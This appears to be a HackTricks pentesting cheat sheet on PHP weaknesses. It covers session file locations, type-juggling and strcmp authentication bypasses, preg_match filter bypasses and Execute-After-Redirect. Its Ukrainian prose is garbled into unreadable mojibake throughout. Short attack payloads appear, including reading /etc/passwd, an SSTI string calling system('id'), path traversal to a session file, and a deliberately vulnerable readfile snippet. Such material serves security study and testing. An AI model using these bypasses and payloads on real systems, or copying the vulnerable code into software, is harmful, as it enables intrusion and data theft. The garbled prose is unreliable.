# PHP Tricks

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Cookies common location:

–¶–µ —Ç–∞–∫–æ–∂ —Å—Ç–æ—Å—É—î—Ç—å—Å—è –∫—É–∫—ñ–≤ phpMyAdmin.

Cookies:
```
PHPSESSID
phpMyAdmin
```
–ú—ñ—Å—Ü—è:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## –û–±—Ö—ñ–¥ –ø–æ—Ä—ñ–≤–Ω—è–Ω—å PHP

### –°–ª–∞–±–∫—ñ –ø–æ—Ä—ñ–≤–Ω—è–Ω–Ω—è/–¢–∏–ø–æ–≤–µ –º–∞–Ω—ñ–ø—É–ª—é–≤–∞–Ω–Ω—è ( == )

–Ø–∫—â–æ –≤ PHP –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è `==`, —Ç–æ —î –Ω–µ—Å–ø–æ–¥—ñ–≤–∞–Ω—ñ –≤–∏–ø–∞–¥–∫–∏, –∫–æ–ª–∏ –ø–æ—Ä—ñ–≤–Ω—è–Ω–Ω—è –Ω–µ –≤–µ–¥–µ —Å–µ–±–µ —Ç–∞–∫, —è–∫ –æ—á—ñ–∫—É—î—Ç—å—Å—è. –¶–µ –ø–æ–≤'—è–∑–∞–Ω–æ –∑ —Ç–∏–º, —â–æ "==" –ø–æ—Ä—ñ–≤–Ω—é—î –ª–∏—à–µ –∑–Ω–∞—á–µ–Ω–Ω—è, –ø–µ—Ä–µ—Ç–≤–æ—Ä–µ–Ω—ñ –≤ –æ–¥–∏–Ω —ñ —Ç–æ–π –∂–µ —Ç–∏–ø, —è–∫—â–æ –≤–∏ —Ç–∞–∫–æ–∂ —Ö–æ—á–µ—Ç–µ –ø–æ—Ä—ñ–≤–Ω—è—Ç–∏, —â–æ —Ç–∏–ø –ø–æ—Ä—ñ–≤–Ω—é–≤–∞–Ω–∏—Ö –¥–∞–Ω–∏—Ö –æ–¥–Ω–∞–∫–æ–≤–∏–π, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ `===`.

–¢–∞–±–ª–∏—Ü—ñ –ø–æ—Ä—ñ–≤–Ω—è–Ω–Ω—è PHP: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../.gitbook/assets/image (567).png>)

{% file src="../../../.gitbook/assets/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

* `"string" == 0 -> True` –†—è–¥–æ–∫, —è–∫–∏–π –Ω–µ –ø–æ—á–∏–Ω–∞—î—Ç—å—Å—è –∑ —á–∏—Å–ª–∞, –¥–æ—Ä—ñ–≤–Ω—é—î —á–∏—Å–ª—É
* `"0xAAAA" == "43690" -> True` –†—è–¥–∫–∏, —â–æ —Å–∫–ª–∞–¥–∞—é—Ç—å—Å—è –∑ —á–∏—Å–µ–ª —É –¥–µ—Å—è—Ç–∫–æ–≤–æ–º—É –∞–±–æ —à—ñ—Å—Ç–Ω–∞–¥—Ü—è—Ç–∫–æ–≤–æ–º—É —Ñ–æ—Ä–º–∞—Ç—ñ, –º–æ–∂—É—Ç—å –±—É—Ç–∏ –ø–æ—Ä—ñ–≤–Ω—è–Ω—ñ –∑ —ñ–Ω—à–∏–º–∏ —á–∏—Å–ª–∞–º–∏/—Ä—è–¥–∫–∞–º–∏ –∑ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–º True, —è–∫—â–æ —á–∏—Å–ª–∞ –±—É–ª–∏ –æ–¥–Ω–∞–∫–æ–≤–∏–º–∏ (—á–∏—Å–ª–∞ –≤ —Ä—è–¥–∫—É —ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç—É—é—Ç—å—Å—è —è–∫ —á–∏—Å–ª–∞)
* `"0e3264578" == 0 --> True` –†—è–¥–æ–∫, —â–æ –ø–æ—á–∏–Ω–∞—î—Ç—å—Å—è –∑ "0e" —ñ –∑–∞ —è–∫–∏–º —Å–ª—ñ–¥—É—î –±—É–¥—å-—â–æ, –±—É–¥–µ –¥–æ—Ä—ñ–≤–Ω—é–≤–∞—Ç–∏ 0
* `"0X3264578" == 0X --> True` –†—è–¥–æ–∫, —â–æ –ø–æ—á–∏–Ω–∞—î—Ç—å—Å—è –∑ "0" —ñ –∑–∞ —è–∫–∏–º —Å–ª—ñ–¥—É—î –±—É–¥—å-—è–∫–∞ –ª—ñ—Ç–µ—Ä–∞ (X –º–æ–∂–µ –±—É—Ç–∏ –±—É–¥—å-—è–∫–æ—é –ª—ñ—Ç–µ—Ä–æ—é) —ñ –∑–∞ —è–∫–∏–º —Å–ª—ñ–¥—É—î –±—É–¥—å-—â–æ, –±—É–¥–µ –¥–æ—Ä—ñ–≤–Ω—é–≤–∞—Ç–∏ 0
* `"0e12334" == "0" --> True` –¶–µ –¥—É–∂–µ —Ü—ñ–∫–∞–≤–æ, –æ—Å–∫—ñ–ª—å–∫–∏ –≤ –¥–µ—è–∫–∏—Ö –≤–∏–ø–∞–¥–∫–∞—Ö –≤–∏ –º–æ–∂–µ—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ –≤—Ö—ñ–¥–Ω–∏–π —Ä—è–¥–æ–∫ "0" —ñ –¥–µ—è–∫–∏–π –≤–º—ñ—Å—Ç, —è–∫–∏–π —Ö–µ—à—É—î—Ç—å—Å—è —ñ –ø–æ—Ä—ñ–≤–Ω—é—î—Ç—å—Å—è –∑ –Ω–∏–º. –¢–æ–º—É, —è–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–¥–∞—Ç–∏ –∑–Ω–∞—á–µ–Ω–Ω—è, —è–∫–µ —Å—Ç–≤–æ—Ä–∏—Ç—å —Ö–µ—à, —â–æ –ø–æ—á–∏–Ω–∞—î—Ç—å—Å—è –∑ "0e" —ñ –±–µ–∑ –±—É–¥—å-—è–∫–æ—ó –ª—ñ—Ç–µ—Ä–∏, –≤–∏ –º–æ–≥–ª–∏ –± –æ–±—ñ–π—Ç–∏ –ø–æ—Ä—ñ–≤–Ω—è–Ω–Ω—è. –í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ **–≤–∂–µ –∑–∞—Ö–µ—à–æ–≤–∞–Ω—ñ —Ä—è–¥–∫–∏** –∑ —Ü–∏–º —Ñ–æ—Ä–º–∞—Ç–æ–º —Ç—É—Ç: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
* `"X" == 0 --> True` –ë—É–¥—å-—è–∫–∞ –ª—ñ—Ç–µ—Ä–∞ –≤ —Ä—è–¥–∫—É –¥–æ—Ä—ñ–≤–Ω—é—î int 0

–ë—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –Ω–∞ [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in\_array()**

**–¢–∏–ø–æ–≤–µ –º–∞–Ω—ñ–ø—É–ª—é–≤–∞–Ω–Ω—è** —Ç–∞–∫–æ–∂ –≤–ø–ª–∏–≤–∞—î –Ω–∞ —Ñ—É–Ω–∫—Ü—ñ—é `in_array()` –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º (–≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ —Ç—Ä–µ—Ç—ñ–π –∞—Ä–≥—É–º–µ–Ω—Ç –≤ true, —â–æ–± –∑—Ä–æ–±–∏—Ç–∏ —Å—Ç—Ä–æ–≥–∏–π –ø–æ—Ä—ñ–≤–Ω—è–Ω–Ω—è):
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

–Ø–∫—â–æ —Ü—è —Ñ—É–Ω–∫—Ü—ñ—è –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è **–±—É–¥—å-—è–∫–æ—ó –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó** (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ –ø–∞—Ä–æ–ª—è) —ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –∫–æ–Ω—Ç—Ä–æ–ª—é—î –æ–¥–Ω—É —Å—Ç–æ—Ä–æ–Ω—É –ø–æ—Ä—ñ–≤–Ω—è–Ω–Ω—è, –≤—ñ–Ω –º–æ–∂–µ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –ø–æ—Ä–æ–∂–Ω—ñ–π –º–∞—Å–∏–≤ –∑–∞–º—ñ—Å—Ç—å —Ä—è–¥–∫–∞ —è–∫ –∑–Ω–∞—á–µ–Ω–Ω—è –ø–∞—Ä–æ–ª—è (`https://example.com/login.php/?username=admin&password[]=`) —ñ –æ–±—ñ–π—Ç–∏ —Ü—é –ø–µ—Ä–µ–≤—ñ—Ä–∫—É:
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
–¢–∞ –∂ –ø–æ–º–∏–ª–∫–∞ –≤–∏–Ω–∏–∫–∞—î –∑ `strcasecmp()`

### –ñ–æ—Ä—Å—Ç–∫–µ –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω—è —Ç–∏–ø—ñ–≤

–ù–∞–≤—ñ—Ç—å —è–∫—â–æ `===` **–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è**, –º–æ–∂—É—Ç—å –±—É—Ç–∏ –ø–æ–º–∏–ª–∫–∏, —è–∫—ñ —Ä–æ–±–ª—è—Ç—å **–ø–æ—Ä—ñ–≤–Ω—è–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–∏–º** –¥–æ **–ø—Ä–∏–≤–µ–¥–µ–Ω–Ω—è —Ç–∏–ø—ñ–≤**. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫—â–æ –ø–æ—Ä—ñ–≤–Ω—è–Ω–Ω—è **–ø–µ—Ä–µ—Ç–≤–æ—Ä—é—î –¥–∞–Ω—ñ –≤ —ñ–Ω—à–∏–π —Ç–∏–ø –æ–±'—î–∫—Ç–∞ –ø–µ—Ä–µ–¥ –ø–æ—Ä—ñ–≤–Ω—è–Ω–Ω—è–º**:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg\_match(/^.\*/)

**`preg_match()`** –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ –¥–ª—è **–ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –≤–≤–µ–¥–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞** (–≤—ñ–Ω **–ø–µ—Ä–µ–≤—ñ—Ä—è—î**, —á–∏ —î –±—É–¥—å-—è–∫–µ **—Å–ª–æ–≤–æ/—Ä–µ–≥—É–ª—è—Ä–Ω–∏–π –≤–∏—Ä–∞–∑** –∑ **—á–æ—Ä–Ω–æ–≥–æ —Å–ø–∏—Å–∫—É** **–ø—Ä–∏—Å—É—Ç–Ω—ñ–º** —É **–≤–≤–µ–¥–µ–Ω–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞**, —ñ —è–∫—â–æ –π–æ–≥–æ –Ω–µ–º–∞—î, –∫–æ–¥ –º–æ–∂–µ –ø—Ä–æ–¥–æ–≤–∂–∏—Ç–∏ —Å–≤–æ—î –≤–∏–∫–æ–Ω–∞–Ω–Ω—è).

#### –û–±—Ö—ñ–¥ –Ω–æ–≤–æ–≥–æ —Ä—è–¥–∫–∞

–û–¥–Ω–∞–∫, –ø—Ä–∏ –æ–±–º–µ–∂–µ–Ω–Ω—ñ –ø–æ—á–∞—Ç–∫—É —Ä–µ–≥—É–ª—è—Ä–Ω–æ–≥–æ –≤–∏—Ä–∞–∑—É `preg_match()` **–ø–µ—Ä–µ–≤—ñ—Ä—è—î –ª–∏—à–µ –ø–µ—Ä—à–∏–π —Ä—è–¥–æ–∫ –≤–≤–µ–¥–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞**, —Ç–æ–º—É, —è–∫—â–æ —è–∫–∏–º–æ—Å—å —á–∏–Ω–æ–º –≤–∏ –∑–º–æ–∂–µ—Ç–µ **–Ω–∞–¥—ñ—Å–ª–∞—Ç–∏** –≤–≤–µ–¥–µ–Ω–Ω—è –≤ **–∫—ñ–ª—å–∫–æ—Ö —Ä—è–¥–∫–∞—Ö**, –≤–∏ –∑–º–æ–∂–µ—Ç–µ –æ–±—ñ–π—Ç–∏ —Ü—é –ø–µ—Ä–µ–≤—ñ—Ä–∫—É. –ü—Ä–∏–∫–ª–∞–¥:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
–©–æ–± –æ–±—ñ–π—Ç–∏ —Ü—é –ø–µ—Ä–µ–≤—ñ—Ä–∫—É, –≤–∏ –º–æ–∂–µ—Ç–µ **–Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –∑–Ω–∞—á–µ–Ω–Ω—è –∑ –Ω–æ–≤–∏–º–∏ —Ä—è–¥–∫–∞–º–∏, –∑–∞–∫–æ–¥–æ–≤–∞–Ω–∏–º–∏ –≤ URL** (`%0A`), –∞–±–æ —è–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ **JSON-–¥–∞–Ω—ñ**, –Ω–∞–¥—ñ—à–ª—ñ—Ç—å —ó—Ö —É **–∫—ñ–ª—å–∫–æ—Ö —Ä—è–¥–∫–∞—Ö**:
```php
{
"cmd": "cat /etc/passwd"
}
```
–ó–Ω–∞–π–¥—ñ—Ç—å –ø—Ä–∏–∫–ª–∞–¥ —Ç—É—Ç: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **–û–±—Ö—ñ–¥ –ø–æ–º–∏–ª–∫–∏ –¥–æ–≤–∂–∏–Ω–∏**

(–¶–µ–π –æ–±—Ö—ñ–¥, –æ—á–µ–≤–∏–¥–Ω–æ, –±—É–≤ —Å–ø—Ä–æ–±–æ–≤–∞–Ω–∏–π –Ω–∞ PHP 5.2.5, —ñ –º–µ–Ω—ñ –Ω–µ –≤–¥–∞–ª–æ—Å—è –∑–º—É—Å–∏—Ç–∏ –π–æ–≥–æ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏ –Ω–∞ PHP 7.3.15)\
–Ø–∫—â–æ –≤–∏ –∑–º–æ–∂–µ—Ç–µ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ `preg_match()` –¥—ñ–π—Å–Ω–∏–π –¥—É–∂–µ **–≤–µ–ª–∏–∫–∏–π –≤—Ö—ñ–¥**, –≤—ñ–Ω **–Ω–µ –∑–º–æ–∂–µ –π–æ–≥–æ –æ–±—Ä–æ–±–∏—Ç–∏** —ñ –≤–∏ –∑–º–æ–∂–µ—Ç–µ **–æ–±—ñ–π—Ç–∏** –ø–µ—Ä–µ–≤—ñ—Ä–∫—É. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫—â–æ –≤—ñ–Ω –±–ª–æ–∫—É—î JSON, –≤–∏ –º–æ–∂–µ—Ç–µ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏:
```bash
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
```
From: [https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0](https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0)

#### ReDoS Bypass

Trick from: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223) and [https://mizu.re/post/pong](https://mizu.re/post/pong)

<figure><img src="../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

–ö–æ—Ä–æ—Ç–∫–æ –∫–∞–∂—É—á–∏, –ø—Ä–æ–±–ª–µ–º–∞ –≤–∏–Ω–∏–∫–∞—î —á–µ—Ä–µ–∑ —Ç–µ, —â–æ —Ñ—É–Ω–∫—Ü—ñ—ó `preg_*` —É PHP –±–∞–∑—É—é—Ç—å—Å—è –Ω–∞ [–±—ñ–±–ª—ñ–æ—Ç–µ—Ü—ñ PCRE](http://www.pcre.org/). –£ PCRE –ø–µ–≤–Ω—ñ —Ä–µ–≥—É–ª—è—Ä–Ω—ñ –≤–∏—Ä–∞–∑–∏ —Å–ø—ñ–≤–ø–∞–¥–∞—é—Ç—å, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –±–∞–≥–∞—Ç–æ —Ä–µ–∫—É—Ä—Å–∏–≤–Ω–∏—Ö –≤–∏–∫–ª–∏–∫—ñ–≤, —â–æ –∑–∞–π–º–∞—î –±–∞–≥–∞—Ç–æ —Å—Ç–µ–∫–æ–≤–æ–≥–æ –ø—Ä–æ—Å—Ç–æ—Ä—É. –ú–æ–∂–ª–∏–≤–æ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ –æ–±–º–µ–∂–µ–Ω–Ω—è –Ω–∞ –∫—ñ–ª—å–∫—ñ—Å—Ç—å –¥–æ–∑–≤–æ–ª–µ–Ω–∏—Ö —Ä–µ–∫—É—Ä—Å—ñ–π, –∞–ª–µ –≤ PHP —Ü–µ –æ–±–º–µ–∂–µ–Ω–Ω—è [–∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º —Å—Ç–∞–Ω–æ–≤–∏—Ç—å 100.000](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit), —â–æ –±—ñ–ª—å—à–µ, –Ω—ñ–∂ –≤–º—ñ—â—É—î—Ç—å—Å—è –≤ —Å—Ç–µ–∫.

[–¶—è —Ç–µ–º–∞ –Ω–∞ Stackoverflow](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error) —Ç–∞–∫–æ–∂ –±—É–ª–∞ –∑–≥–∞–¥–∞–Ω–∞ –≤ –ø–æ—Å—Ç—ñ, –¥–µ –±—ñ–ª—å—à –¥–µ—Ç–∞–ª—å–Ω–æ –æ–±–≥–æ–≤–æ—Ä—é—î—Ç—å—Å—è —Ü—è –ø—Ä–æ–±–ª–µ–º–∞. –ù–∞—à–µ –∑–∞–≤–¥–∞–Ω–Ω—è —Å—Ç–∞–ª–æ –∑—Ä–æ–∑—É–º—ñ–ª–∏–º:\
**–ù–∞–¥—ñ—Å–ª–∞—Ç–∏ –≤—Ö—ñ–¥–Ω—ñ –¥–∞–Ω—ñ, —è–∫—ñ –∑–º—É—Å–∏–ª–∏ –± regex –≤–∏–∫–æ–Ω–∞—Ç–∏ 100\_000+ —Ä–µ–∫—É—Ä—Å—ñ–π, –≤–∏–∫–ª–∏–∫–∞–≤—à–∏ SIGSEGV, –∑–º—É—Å–∏–≤—à–∏ —Ñ—É–Ω–∫—Ü—ñ—é `preg_match()` –ø–æ–≤–µ—Ä–Ω—É—Ç–∏ `false`, —Ç–∞–∫–∏–º —á–∏–Ω–æ–º –∑–º—É—Å–∏–≤—à–∏ –¥–æ–¥–∞—Ç–æ–∫ –≤–≤–∞–∂–∞—Ç–∏, —â–æ –Ω–∞—à—ñ –≤—Ö—ñ–¥–Ω—ñ –¥–∞–Ω—ñ –Ω–µ —î —à–∫—ñ–¥–ª–∏–≤–∏–º–∏, –ø—ñ–¥–∫–∏–¥–∞—é—á–∏ —Å—é—Ä–ø—Ä–∏–∑ –≤ –∫—ñ–Ω—Ü—ñ –∫–æ—Ä–∏—Å–Ω–æ–≥–æ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —â–æ—Å—å –Ω–∞ –∫—à—Ç–∞–ª—Ç `{system(<verybadcommand>)}` –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è SSTI --> RCE --> flag :)**.

–û—Ç–∂–µ, –≤ —Ç–µ—Ä–º—ñ–Ω–∞—Ö regex, –º–∏ –Ω–∞—Å–ø—Ä–∞–≤–¥—ñ –Ω–µ –≤–∏–∫–æ–Ω—É—î–º–æ 100k "—Ä–µ–∫—É—Ä—Å—ñ–π", –∞ –∑–∞–º—ñ—Å—Ç—å —Ü—å–æ–≥–æ –º–∏ —Ä–∞—Ö—É—î–º–æ "–∫—Ä–æ–∫–∏ –Ω–∞–∑–∞–¥", —è–∫—ñ, —è–∫ –∑–∞–∑–Ω–∞—á–∞—î [–¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—è PHP](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit), –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º —Å—Ç–∞–Ω–æ–≤–ª—è—Ç—å 1\_000\_000 (1M) —É –∑–º—ñ–Ω–Ω—ñ–π `pcre.backtrack_limit`.\ 
–©–æ–± –¥–æ—Å—è–≥—Ç–∏ —Ü—å–æ–≥–æ, `'X'*500_001` –ø—Ä–∏–∑–≤–µ–¥–µ –¥–æ 1 –º—ñ–ª—å–π–æ–Ω–∞ –∫—Ä–æ–∫—ñ–≤ –Ω–∞–∑–∞–¥ (500k –≤–ø–µ—Ä–µ–¥ —ñ 500k –Ω–∞–∑–∞–¥):
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```
### –ü–µ—Ä–µ—Ç–≤–æ—Ä–µ–Ω–Ω—è —Ç–∏–ø—ñ–≤ –¥–ª—è –æ–±—Ñ—É—Å–∫–∞—Ü—ñ—ó PHP
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## Execute After Redirect (EAR)

–Ø–∫—â–æ PHP –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—î –Ω–∞ —ñ–Ω—à—É —Å—Ç–æ—Ä—ñ–Ω–∫—É, –∞–ª–µ –∂–æ–¥–Ω–∞ —Ñ—É–Ω–∫—Ü—ñ—è **`die`** –∞–±–æ **`exit`** –Ω–µ –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è –ø—ñ—Å–ª—è —Ç–æ–≥–æ, —è–∫ –∑–∞–≥–æ–ª–æ–≤–æ–∫ `Location` –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ, PHP –ø—Ä–æ–¥–æ–≤–∂—É—î –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —Ç–∞ –¥–æ–¥–∞—î –¥–∞–Ω—ñ –¥–æ —Ç—ñ–ª–∞:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## –í—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –æ–±—Ö–æ–¥—É —à–ª—è—Ö—É —Ç–∞ –≤–∫–ª—é—á–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ:

{% content-ref url="../../../pentesting-web/file-inclusion/" %}
[file-inclusion](../../../pentesting-web/file-inclusion/)
{% endcontent-ref %}

## –ë—ñ–ª—å—à–µ —Ç—Ä—é–∫—ñ–≤

* **register\_globals**: –£ **PHP < 4.1.1.1** –∞–±–æ —è–∫—â–æ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–æ, **register\_globals** –º–æ–∂–µ –±—É—Ç–∏ –∞–∫—Ç–∏–≤–Ω–∏–º (–∞–±–æ —ó—Ö–Ω—è –ø–æ–≤–µ–¥—ñ–Ω–∫–∞ —ñ–º—ñ—Ç—É—î—Ç—å—Å—è). –¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –≤ –≥–ª–æ–±–∞–ª—å–Ω–∏—Ö –∑–º—ñ–Ω–Ω–∏—Ö, —Ç–∞–∫–∏—Ö —è–∫ $\_GET, —è–∫—â–æ –≤–æ–Ω–∏ –º–∞—é—Ç—å –∑–Ω–∞—á–µ–Ω–Ω—è, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, $\_GET\["param"]="1234", –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –Ω–∏—Ö —á–µ—Ä–µ–∑ **$param. –¢–∞–∫–∏–º —á–∏–Ω–æ–º, –≤—ñ–¥–ø—Ä–∞–≤–ª—è—é—á–∏ HTTP –ø–∞—Ä–∞–º–µ—Ç—Ä–∏, –≤–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏ –∑–º—ñ–Ω–Ω—ñ**, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –≤ –∫–æ–¥—ñ.
* **PHPSESSION –∫—É–∫–∏ –æ–¥–Ω–æ–≥–æ –¥–æ–º–µ–Ω—É –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –≤ –æ–¥–Ω–æ–º—É –º—ñ—Å—Ü—ñ**, —Ç–æ–º—É —è–∫—â–æ –≤ –º–µ–∂–∞—Ö –¥–æ–º–µ–Ω—É **–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è —Ä—ñ–∑–Ω—ñ –∫—É–∫–∏ –≤ —Ä—ñ–∑–Ω–∏—Ö —à–ª—è—Ö–∞—Ö**, –≤–∏ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏ —Ç–∞–∫, —â–æ–± —à–ª—è—Ö **–æ—Ç—Ä–∏–º—É–≤–∞–≤ –¥–æ—Å—Ç—É–ø –¥–æ –∫—É–∫–∏ —ñ–Ω—à–æ–≥–æ —à–ª—è—Ö—É**, –≤—Å—Ç–∞–Ω–æ–≤–∏–≤—à–∏ –∑–Ω–∞—á–µ–Ω–Ω—è –∫—É–∫–∏ —ñ–Ω—à–æ–≥–æ —à–ª—è—Ö—É.\
–¢–∞–∫–∏–º —á–∏–Ω–æ–º, —è–∫—â–æ **–æ–±–∏–¥–≤–∞ —à–ª—è—Ö–∏ –æ—Ç—Ä–∏–º—É—é—Ç—å –¥–æ—Å—Ç—É–ø –¥–æ –∑–º—ñ–Ω–Ω–æ—ó –∑ –æ–¥–Ω–∞–∫–æ–≤–æ—é –Ω–∞–∑–≤–æ—é**, –≤–∏ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏ —Ç–∞–∫, —â–æ–± **–∑–Ω–∞—á–µ–Ω–Ω—è —Ü—ñ—î—ó –∑–º—ñ–Ω–Ω–æ—ó –≤ path1 –∑–∞—Å—Ç–æ—Å–æ–≤—É–≤–∞–ª–æ—Å—è –¥–æ path2**. –Ü —Ç–æ–¥—ñ path2 –≤–≤–∞–∂–∞—Ç–∏–º–µ –∑–º—ñ–Ω–Ω—ñ path1 –¥—ñ–π—Å–Ω–∏–º–∏ (–Ω–∞–¥–∞—é—á–∏ –∫—É–∫–∏ —ñ–º'—è, —è–∫–µ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î –π–æ–º—É –≤ path2).
